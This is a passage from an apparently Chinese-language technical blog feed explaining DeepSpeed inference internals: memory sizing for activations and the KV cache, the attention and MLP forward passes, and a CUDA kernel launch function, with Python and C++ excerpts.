class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi></mrow><annotation encoding="application/x-tex">b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">b</span></span></span></span></li><li>序列长度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi></mrow><annotation encoding="application/x-tex">s</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">s</span></span></span></span></li></ul><p>在多头注意力中，我们有 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><msub><mi>W</mi><mi>Q</mi></msub></mrow><annotation encoding="application/x-tex">Q=XW_Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><mi>X</mi><msub><mi>W</mi><mi>K</mi></msub></mrow><annotation encoding="application/x-tex">K=XW_K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><mi>X</mi><msub><mi>W</mi><mi>V</mi></msub></mrow><annotation encoding="application/x-tex">V=XW_V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.22222em;">V</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，这三个前向计算的矩阵乘法，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>大小是 (b, s, h)；计算后得到的 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span> 大小都是 (b, a, s, h/a) （不考虑 GQA 的情况），因此一共需要 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mi>b</mi><mi>s</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">3bsh</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">3</span><span class="mord mathnormal">b</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span></span></span></span> 的内存大小。随后做 layernorm、注意力计算等操作还需要大约 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>5</mn><mi>b</mi><mi>s</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">5bsh</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">5</span><span class="mord mathnormal">b</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span></span></span></span> 的内存大小，因此代码中 <code>activation_size</code> 直接分配了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>10</mn><mi>b</mi><mi>s</mi><mi>h</mi></mrow><annotation encoding="application/x-tex">10bsh</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord">10</span><span class="mord mathnormal">b</span><span class="mord mathnormal">s</span><span class="mord mathnormal">h</span></span></span></span> 的内存大小。</p><p>代码中 <code>temp_size</code> 是用来存放注意力计算 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup></mrow><annotation encoding="application/x-tex">QK^T</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0358em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span></span></span></span> 的值。因此大小是 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>b</mi><mi>a</mi><msup><mi>s</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">bas^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord mathnormal">ba</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span>。</p><p>每个 batch 的每一层 transformer 都需要一个 KV cache， 因此总大小为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mi>b</mi><mi>s</mi><mi>l</mi><mi>h</mi><mo>×</mo></mrow><annotation encoding="application/x-tex">2bslh \times</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mord mathnormal">b</span><span class="mord mathnormal">s</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">h</span><span class="mord">×</span></span></span></span> sizeof(T)，与 <code>cache_size</code> 的计算代码对应。</p><h4 id="attention">attention</h4><p>接下来我们看看 attention 的计算过程。准备好函数的各项参数后，直接调用 <code>DeepSpeedSelfAttention:forward</code> 就可以算出注意力值了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># We set the prev key/value to None when there is a prompt</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">input</span>.shape[<span class="hljs-number">1</span>] &gt; <span class="hljs-number">1</span>:<br>    self.layer_past = <span class="hljs-literal">None</span><br>layer_past = layer_past <span class="hljs-keyword">if</span> layer_past <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> self.layer_past<br><span class="hljs-comment"># ....</span><br><span class="hljs-keyword">with</span> torch.no_grad():<br>    attention_output, key, value, context_outputtn_ctx, inp_norm = \<br>            self.attention(<span class="hljs-built_in">input</span>,<br>                    input_mask,<br>                    head_mask,<br>                    layer_past,<br>                    get_present,<br>                    encoder_hidden_states,<br>                    encoder_attention_mask,<br>                    output_attentions,<br>                    self.norm_w,<br>                    self.norm_b,<br>                    alibi)<br><br>    presents = (key, value)<br></code></pre></td></tr></table></figure><p><code>self.attention</code> 直接对应了 <code>DeepSpeedSelfAttention</code> 的实现，因此再把目光转向下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>, input_mask, head_mask=<span class="hljs-literal">None</span>, layer_past=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">            get_present=<span class="hljs-literal">False</span>, encoder_hidden_states=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">            encoder_attention_mask=<span class="hljs-literal">None</span>, output_attentions=<span class="hljs-literal">False</span>,</span><br><span class="hljs-params">            norm_w=<span class="hljs-literal">None</span>, norm_b=<span class="hljs-literal">None</span>, alibi=<span class="hljs-literal">None</span></span>):<br>        <span class="hljs-comment"># ...</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.config.pre_layer_norm:<br>            qkv_out = self.linear_func(<span class="hljs-built_in">input</span>=<span class="hljs-built_in">input</span>,<br>                                       weight=self._attn_qkvw,<br>                                       bias=self._attn_qkvb,<br>                                       add_bias=self.attn_qkvb <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>,<br>                                       do_flash_attn=<span class="hljs-literal">False</span>,<br>                                       num_heads=self.num_attention_heads_per_partition,<br>                                       num_layers=DeepSpeedSelfAttention.num_layers)<br>        <span class="hljs-keyword">else</span>:<br>            qkv_out = self.qkv_func(<span class="hljs-built_in">input</span>=<span class="hljs-built_in">input</span>,<br>                                    weight=self._attn_qkvw,<br>                                    bias=self._attn_qkvb,<br>                                    gamma=norm_w,<br>                                    beta=norm_b)<br><br>        context_layer, key_layer, value_layer = self.compute_attention(qkv_out=qkv_out,<br>                                                                       input_mask=input_mask,<br>                                                                       layer_past=layer_past,<br>                                                                       alibi=alibi)<br>        output = self.vector_matmul_func(<span class="hljs-built_in">input</span>=context_layer, weight=self.attn_ow)<br>        inp_norm = qkv_out[-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> self.config.mlp_after_attn <span class="hljs-keyword">and</span> self.mp_group <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <br>          <span class="hljs-keyword">and</span> dist.get_world_size(group=self.mp_group) &gt; <span class="hljs-number">1</span>:<br>            dist.all_reduce(output, group=self.mp_group)<br>        <span class="hljs-keyword">return</span> (output, key_layer, value_layer, context_layer, inp_norm)<br></code></pre></td></tr></table></figure><p>这里涉及到了四个 Op 算子，流程如下图。<code>QKVGemmOp</code> 计算了 pre layer norm 和 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><msub><mi>W</mi><mi>Q</mi></msub></mrow><annotation encoding="application/x-tex">Q=XW_Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">Q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，<code>SoftmaxContextOp</code> 计算了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><mi>Q</mi><msup><mi>K</mi><mi>T</mi></msup><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><msqrt><msub><mi>n</mi><mrow><mi>d</mi><mi>i</mi><mi>m</mi></mrow></msub></msqrt><mo stretchy="false">)</mo><mi>V</mi></mrow><annotation encoding="application/x-tex">softmax((QK^T)/\sqrt{n_{dim}})V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1561em;vertical-align:-0.3147em;"></span><span class="mord mathnormal">so</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">((</span><span class="mord mathnormal">Q</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8413em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">T</span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mord">/</span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7253em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">im</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-2.6853em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg xmlns="http://www.w3.org/2000/svg" width="400em" height="1.08em" viewBox="0 0 400000 1080" preserveAspectRatio="xMinYMin slice"><path d="M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z"/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.3147em;"><span></span></span></span></span></span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span>，最后 <code>VectorMatMulOp</code> 计算了 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mrow><mi>A</mi><mi>t</mi><mi>t</mi><mi>n</mi></mrow><msub><mi>W</mi><mi>O</mi></msub></mrow><annotation encoding="application/x-tex">{Attn}W_O</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="mord mathnormal">tt</span><span class="mord mathnormal">n</span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3283em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.02778em;">O</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>。</p><p><img src="/img/LLM/deepspeed_attention.png" alt=""></p><p><img src="https://www.microsoft.com/en-us/research/uploads/prod/2021/05/Fig1_DeepSpeed5_Blog.jpg" alt=""></p><h4 id="mlp">mlp</h4><p>attention 计算过程结束后，紧接着就是 MLP 的计算过程。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">    self.layer_past = presents <span class="hljs-keyword">if</span> layer_past <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    output = self.mlp(attention_output, <span class="hljs-built_in">input</span>, inp_norm, self.attention.attn_ob)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.config.pre_layer_norm:<br>        output = inference_module.layer_norm(output, self.norm_w, self.norm_b, self.config.epsilon)<br><br>    output = output.to(input_type)<br><span class="hljs-keyword">if</span> get_present:<br>    output = (output, presents)<br><br><span class="hljs-keyword">if</span> self.config.return_single_tuple:<br>    <span class="hljs-keyword">return</span> (output, )<br><span class="hljs-keyword">elif</span> self.config.return_tuple:<br>    <span class="hljs-keyword">return</span> output <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(output) <span class="hljs-keyword">is</span> <span class="hljs-built_in">tuple</span> <span class="hljs-keyword">else</span> (output, attn_mask)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> output<br></code></pre></td></tr></table></figure><p>当然，<code>self.mlp</code> 也对应着 <code>DeepSpeedMLP</code> 的实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>, residual, residual_norm, bias</span>):<br>  <span class="hljs-comment"># ...</span><br>  <span class="hljs-keyword">if</span> self.attn_nw <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    output = self.fused_gemm_gelu(<span class="hljs-built_in">input</span>=residual_norm,<br>                                  weight=self._inter_w,<br>                                  bias=self._inter_b,<br>                                  weight_out=self.output_w)<br>  <span class="hljs-keyword">else</span>:<br>    output, residual_add = self.mlp_gemm_func(<span class="hljs-built_in">input</span>=<span class="hljs-built_in">input</span>,<br>                                              residual=residual,<br>                                              weight_interm=self._inter_w,<br>                                              weight_out=self.output_w,<br>                                              input_bias=bias,<br>                                              bias=self._inter_b,<br>                                              gamma=self.attn_nw,<br>                                              beta=self.attn_nb)<br>  residual = self.residual_add_func(hidden_state=output,<br>                                    residual=residual,<br>                                    add_bias=bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>,<br>                                    attention_output=<span class="hljs-built_in">input</span>,<br>                                    attention_bias=bias <span class="hljs-keyword">if</span> bias <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> self.output_b,<br>                                    final_bias=self.output_b,<br>                                    residual_add=residual_add)<br>  <span class="hljs-keyword">if</span> self.mp_group <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> dist.get_world_size(group=self.mp_group) &gt; <span class="hljs-number">1</span>:<br>    dist.all_reduce(residual, group=self.mp_group)<br>  <span class="hljs-keyword">return</span> residual<br></code></pre></td></tr></table></figure><p>这里涉及到了四个 Op 算子，流程如下图。<code>MLPGemmOp</code> 计算了 FFN，<code>ResidualAddOp</code> 计算了偏移加法。</p><p><img src="/img/LLM/deepspeed_mlp.png" alt=""></p><p><img src="https://www.microsoft.com/en-us/research/uploads/prod/2021/05/Fig1_DeepSpeed5_Blog.jpg" alt=""></p><h2 id="高性能算子的实现">高性能算子的实现</h2><p>deepspeed inference v1 版本的算子代码很多。我这里只挑重点，一起来看一下 Attention 部分。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">template</span> &lt;<span class="hljs-keyword">typename</span> T&gt;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">launch_bias_add_transform_0213</span><span class="hljs-params">(T* output, T* k_cache, T* v_cache,<span class="hljs-type">const</span> T* vals, <span class="hljs-type">const</span> T* bias,</span></span><br><span class="hljs-params"><span class="hljs-function">      <span class="hljs-type">int</span> batch_size, <span class="hljs-type">int</span> seq_length, <span class="hljs-type">unsigned</span> seq_offset, <span class="hljs-type">int</span> all_tokens, <span class="hljs-type">int</span> hidden_dim,</span></span><br><span class="hljs-params"><span class="hljs-function">      <span class="hljs-type">int</span> heads, <span class="hljs-type">int</span> num_kv, <span class="hljs-type">int</span> rotary_dim, <span class="hljs-type">bool</span> rotate_half, <span class="hljs-type">bool</span> rotate_every_two,</span></span><br><span class="hljs-params"><span class="hljs-function">      cudaStream_t stream, <span class="hljs-type">int</span> trans_count, <span class="hljs-type">int</span> max_out_tokens, <span class="hljs-type">float</span> rope_theta)</span> </span>&#123;<br>    hidden_dim &gt;&gt;= <span class="hljs-number">3</span>;<br>    <span class="hljs-type">int</span> head_ext = <span class="hljs-number">1</span>;  <span class="hljs-comment">// (hidden_dim - 1) / MAX_THREADS + 1;</span><br>    <span class="hljs-function">dim3 <span class="hljs-title">block_dim</span><span class="hljs-params">(hidden_dim / heads, (heads / head_ext))</span></span>;<br>    <span class="hljs-function">dim3 <span class="hljs-title">grid_dim</span><span class="hljs-params">(batch_size, seq_length, (trans_count * head_ext))</span></span>;<br>    bias_add_transform_0213&lt;&lt;&lt;grid_dim, block_dim, <span class="hljs-number">0</span>, stream&gt;&gt;&gt;(output,<br>                                                                k_cache,<br>                                                                v_cache,<br>                                                                vals,<br>                                                                bias,<br>                                                                hidden_dim,<br>                                                                seq_length,<br>                                                                seq_offset,<br>                                                                all_tokens,<br>                                                                heads,<br>                                                                num_kv &gt; <span class="hljs-number">0</span> ? (heads / num_kv) : <span class="hljs-number">1</span>,<br>                                                                num_kv &gt; <span class="hljs-number">0</span> ? num_kv : heads,<br>                                                                rotary_dim &gt;&gt; <span class="hljs-number">3</span>,<br>                                                                rotate_half,<br>                                                                rotate_every_two,<br>                                                                head_ext,<br>                                                                max_out_tokens,<br>                                                                rope_theta);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>deepspeed</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入探索 deepspeed（一）</title>
    <link href="/2024/04/20/2024-4-20-deepspeed/"/>
    <url>/2024/04/20/2024-4-20-deepspeed/</url>
    
